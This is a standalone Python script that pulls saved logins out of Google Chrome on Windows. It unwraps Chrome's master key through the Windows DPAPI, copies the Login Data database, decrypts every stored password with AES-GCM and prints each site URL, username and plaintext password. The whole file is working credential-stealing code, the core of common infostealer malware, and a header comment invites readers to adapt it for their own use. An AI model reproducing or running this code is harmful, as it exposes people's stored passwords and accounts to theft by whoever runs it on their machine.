#This Python script is used to not only fetch browser saved passwords, but also Decrypt these Passwords.
# you can modify this script for your own usage.
import os
import json
import shutil
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES

def get_masterkey():
    """
    This function is used to get masterkey for decrypting the encrypted passwords
    """ 
    print("[+] Getting Masterkey ")
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
        'r', encoding="utf-8") as f:
            file = json.loads(f.read())
    except:
        exit()
    master_key = base64.b64decode(file["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    print("[+] got the Masterkey : {}...".format(master_key[:10]))
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    """
        Here we are passing the buffer and Master Key to Decrypt the Password
    """
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"

def extract_passwords():
    """
    This function is used to get all usernames,passwords,urls and all origins
    """
    master_key = get_masterkey()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    try:
        shutil.copy2(login_db,"Logins.db")  
    except:
        print("[*] Chrome Browser Not Installed !!")
    conn = sqlite3.connect("Logins.db")
    cursor = conn.cursor()
    print("[+] Extracted Passwords : \n")
    try:
        cursor.execute("SELECT origin_url,action_url,username_value,password_value FROM logins")
        for r in cursor.fetchall():
            origin_url = r[0]
            action_url = r[1]
            if len(action_url)<1:
                action_url = "None"
            username = r[2]
            encrypted_password = r[3]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                print("[~] Origin URL: " + origin_url + "\n[~] Action URL: " + action_url + "\n[~] User Name: " + username + "\n[~] Password: " + decrypted_password + "\n" + "=" * 25 + "\n")
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("Logins.db")
    except Exception as e:
        pass

extract_passwords()
